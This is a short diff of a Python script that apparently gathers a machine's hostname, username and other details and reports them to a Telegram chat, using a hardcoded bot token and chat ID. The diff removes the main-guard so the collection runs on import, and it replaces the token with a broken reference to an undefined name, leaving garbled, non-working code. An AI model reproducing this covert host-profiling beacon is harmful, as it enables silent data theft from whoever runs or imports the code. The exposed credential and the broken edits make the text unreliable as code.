@@ -2,8 +2,9 @@ import requests
 import socket
 import getpass
 import subprocess
+from Dev import app
 
-TOKEN = "8737638623:AAHWUjfZOhKH-YYcXNhlYUxqqiR5a9KItvo"
+app = Token
 CHAT_ID = "-1002843633996"
 
 def get_iso():
@@ -42,7 +43,6 @@ def pro(user, dem):
     except Exception as e:
         return f"Error: {str(e)}"
 
-if __name__ == "__main__":
     iso = get_iso()
     name = socket.gethostname()
     user = getpass.getuser()
